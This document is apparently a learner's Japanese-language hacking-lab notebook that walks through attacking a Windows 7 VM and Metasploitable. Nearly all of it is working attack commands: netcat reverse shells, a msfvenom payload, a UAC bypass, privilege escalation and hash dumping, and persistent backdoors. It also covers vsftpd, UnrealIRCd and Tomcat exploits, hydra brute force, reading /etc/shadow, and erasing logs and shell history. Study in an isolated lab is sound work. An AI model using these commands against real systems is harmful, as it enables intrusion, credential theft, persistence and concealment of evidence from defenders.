# ハッキング・ラボ メモ

## Windowsハッキング

- VirtualBox

  ```bash
  # /etc/vbox/networks.conf ファイルを新規作成。以下を記入
  * 10.0.0.0/24
  ```

  - ホストネットワークマネージャ > 作成
    - アダプター
      - IPv4: 10.0.0.1
      - IPv4マスク: 255.255.255.0
    - DHCPサーバ
      - サーバアドレス: 10.0.0.100
      - サーバマスク: 255.255.255.0
        - アドレス下限: 10.0.0.101
        - アドレス上限: 10.0.0.254
- [Windows7試用ovaファイル](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/)
  - 選択オプション
    - Virtual Machines: IE8 on Win7(x86)
    - VM platform: VirtualBox

```bash
# Windows側
nc.exe -lvp 5555
```

- -l: 待ち受け
- -v: 詳細表示
- -p: ポート番号指定

```bash
netstat -an
```

- -a: すべての接続を表示
- -n: 名前解決しない。サービス名解決しない。

```bash
# Windows側
nc.exe -lvp 5555 -e cmd.exe
# ホスト側
nc [target IP] 5555
```

### リバースシェル

```bash
# ホスト側
nc -lvp 5555
# Windows側
nc.exe [host IP] 5555 -e cmd.exe
```

### Metasploit Framework

- 調査、侵入、攻撃、バックドアの設置・接続。サーバ侵入の一連の攻撃をサポート
- 実践で使われる場面は少ない

```bash
msfconsole

show exploits
```

- Exploitのランク
  - manual < low < average < normal < good < great < excellent
  - excellentが最も望ましく、システムをクラッシュさせることなく任意のコマンドを実行できる

```bash
search type:payload reverse_tcp platform:windows

# TCP型リバースシェルを作成
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 -f exe -o ./evil.exe
# -p: ペイロードのパス
# -f: 出力ファイルの形式
# -o: 出力ファイルのパス
# LHOST: ペイロードのオプション。接続先を指定

# リバースシェルを待ち受ける
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST [ホストIP]
# evil.exeをWindows側で起動した後
# リバースシェルを確立する
exploit
```

```bash
# Meterpreterプロンプトで使用可能
pwd, ls, cd
```

### パスワードハッシュを入手する

```bash
# ユーザ名を確認
getuid
# 権限昇格のため、一旦meterpreterセッションをバックグラウンドへ
background
# UACバイパスモジュール
use exploit/windows/local/bypassuac
set SESSION [セッションNo]
set payload windows/meterpreter/reverse_tcp
set LHOST [ホストIP]
exploit

# ユーザ確認
getuid
# 権限昇格
getsystem -t 1
# ユーザ確認
getuid
# パスワードハッシュダンプ取得
# ※現状は"ArgumentError wrong number of arguments"エラーとなっている
run hashdump
```

```bash
# パスワード解析
john [パスワードファイルパス] --show
john --wordlist=/usr/share/john/password.lst --format:nt .[パスワードファイルパス]
```

```bash
# 通常ユーザのセッションを閉じておく。Windows側のプロセスからevil.exeが消える
sessions -k 1

# システム情報を収集（レジストリ、パスワードハッシュ等。時間がかかる）
sessions 2
run scraper
```

```bash
# Meterpreterプロンプト→シェルに切り替える
shell
# 自動起動の内容を列挙
wmic startup

# 永続的なバックドアを設置
run persistence -X -i 60 -P windows/meterpreter/reverse_tcp -p 4444 -r [ホストIP]
# -X: システム起動時に自動開始
# -i: 接続試行の間隔（秒）
# -P: ペイロードを使用する
# -p: ペイロード接続先ポート
# -r: ペイロード接続先IP
```

```bash
# ログ消去（Application, Security, System）
clearev

# 乱暴なやり方だが、delコマンドで削除することもできる
del %WINDIR%\*. log /a /s /q /f
# /a: 削除ファイルの属性指定
# /s: サブフォルダも対象
# /q: ワイルドカード使用時に確認メッセージを表示しない
# /f: 読み取り専用ファイルを矯正削除
```

## Metasploitableハッキング

```bash
# /etc/network/interfaces を編集
auto eth0
iface eth0 inet dhcp
# ↓
auto eth0
iface eth0 inet static
address 10.0.0.5
netmask 255.255.255.0
gateway 10.0.0.1
```

### ポートスキャン

```bash
# ネットワーク内のIP列挙
nmap -sP 10.0.0.0/24
# 開いているポートの列挙
sudo nmap -sV -O -p- 10.0.0.5
# -p-: 1〜65535ポートを対象
# -sV: 各ポートのサービスのバージョンを検出する
# -O: フィンガープリント。ターゲットOSを特定
```

### vsfpdのバックドアを利用

```bash
# vsfpdでTCPを開く
nc 10.0.0.5 21
USER attacker:)
PASS hoge
# 6200ポートでroot権限のシェルを開ける
nc -nv 10.0.0.5 6200
```

### vsfpdをMetasploitで攻撃

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 10.0.0.5
show options
exploit

# root権限なので大抵のことはできる（例: バックドア用アカウント作成）
useradd -m newuser -G sudo -s /bin/bash; passwd newuser
```

### FTPアカウントを攻撃

```bash
# userlist.txt
root
sys
msfadmin
admin
user
service
postgres
tomcat

# password.txt
user
password
12345678
msfadmin
root
guest
batman
asdfasdf
tomcat

# brute force attack
# FTP
hydra -L ./userlist.txt -P ./password.txt -t 8 10.0.0.5 ftp
# SSH（タスク数が大きいと警告されるため4に）
hydra -L ./userlist.txt -P ./password.txt -t 4 ssh://10.0.0.5:22
# patator（[ERROR] target ssh://10.0.0.5:22/ does not support password authenticationが表示されるときはこちらを使う）
patator ssh_login host=10.0.0.5 user=FILE0 password=FILE1 0=./userlist.txt 1=./password.txt
```

```bash
nc 10.0.0.5 1524

cat /etc/shadow | grep -E "^root|^msfadmin"

# 総当り攻撃
john --incremental password.txt
```

### HydraでHTTPの認証解析

```bash
hydra -L userlist.txt -P password.txt -s 8180 10.0.0.5 http-post-form "/admin/j_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password"
```

### tomcat攻撃

```bash
msfconsole
grep exploit search tomcat
use exploit/multi/http/tomcat_mgr_upload
show targets
set target 2
set payload linux/x86/shell_bind_tcp
set HttpUsername tomcat
set HttpPassword tomcat
set RHOST 10.0.0.5
set RPORT 8180
show options
# tomcat55権限でshell操作可能になる
exploit
```

### ディレクトリトラバーサル

```bash
# ログインを試してみる
smbclient -L //10.0.0.5

# ディレクトリトラバーサルを試す
use auxiliary/admin/smb/samba_symlink_traversal
set RHOSTS 10.0.0.5
set SMBSHARE tmp
exploit
exit

# アクセス可能になった（root権限はない）
smbclient //10.0.0.5/tmp

# sshキー取得
cd \rootfs\root\.ssh\
# ダウンロードする
get authorized_keys

# ファイラーで "smb://10.0.0.5/tmp" で同様にアクセス可
```

### Unreal IRCバックドア

```bash
sudo apt install hexchat

msfconsole
search unrealirc
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 10.0.0.5
show payloads
set payload cmd/unix/bind_perl # （書籍には書いていない）
run
# Ctrl+zでバックグランドへ

# Meterpreterへ切り替える
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run

sessions
sessions -i 2
# Ctrl+zでバックグランドへ

sessions -k 1
```

```bash
# Netcatで上記処理を再現

# ターミナルA
# 4444で待ち状態
nc -lvp 4444

# ターミナルB
# IRCにアクセス
nc 10.0.0.5 6667
# バックドア用のAB
AB; nc 10.0.0.1 4444 -e /bin/bash

# これでターミナルA側でshell操作可能
```

### ログを消去、改ざん

|       パス        |          説明          | 閲覧コマンド |
| ----------------- | ---------------------- | ------------ |
| /var/log/btmp     | ログイン失敗           | lastb        |
| /var/log/wtmp     | ログイン成功           | last         |
| /var/log/lastlog  | ユーザ最終ログイン     | lastlog      |
| /var/faillog      | ユーザログイン失敗回数 | faillog      |
| /var/log/tallylog | ユーザログイン失敗回数 | pam_tally2   |

```bash
# 乱暴な消し方（3回ランダム情報で上書き）
shred -n 3 -zu /var/log/messages
# -n: ランダム情報を書き込む回数
# -z: 最後に0を書き込む
# -u: ファイルを削除する

# ファイルの中身だけクリアする
# 履歴記録上限を0に変更する
echo $HISTSIZE
export HISTSIZE=0
echo $HISTSIZE
# 履歴をクリア
> ~/.bash_history
```

## Netcatを用いた各種通信

### ファイル転送

```bash
# Windowsg側
C:\Work\nc111nt\nc.exe -lvp 4444 < in.txt

# ホスト側
nc [target IP] 4444 > out


# ターゲットのbashが破壊されている場合は転送したshellで調査
# ホスト側
nc -lvp 4444 < /bin/bash

# ターゲット（Linux）側
nc [host IP] 4444 > new_bash
```

### ロギング

```bash
# ホスト側でログを監視
nc -lp 9999 >> log.txt
tail -f log.txt

# ターゲット端末から送信したい内容を転送
nc [host IP] 9999 < in.txt

# コマンド結果を転送
date | nc -q 1 [host IP] 9999
```

## 有線LANハッキング

### Wireshark

```bash
# フィルター
http
http.request.method == "GET"
```

### NetworkMiner

<https://www.netresec.com/index.ashx?page=NetworkMiner>

### Xplico

- 画像やメール解析が得意なツール

```bash
sudo apt install xplico
service apache2 restart
/etc/init.d/xplico start

# http://localhost:9876/ にアクセス
```

### ダンプツール

```bash
# RAW形式でtraffic.binを保存してから
xxd traffic.bin
```

### Wiresharkでnmap結果を解析

```bash
# TCPフルコネクトスキャン
nmap -sT -p 445 [target IP]
# TCP SYNスキャン（サービスのログに記録されない）
sudo nmap -sS -p 445 [target IP]
# UDPスキャン
sudo nmap -sU -p 53 [target IP]
# Pingスキャン（ping送信するだけ。範囲指定で使う）
nmap -sP -Pn 10.0.0.101
nmap -sP 10.0.0.102 --send-ip
# FINスキャン
sudo nmap -sF -p 21 10.0.0.101
# Xmasスキャン
sudo nmap -sX -p 21 10.0.0.101
# Nullスキャン
sudo nmap -sN -p 21 10.0.0.101
```
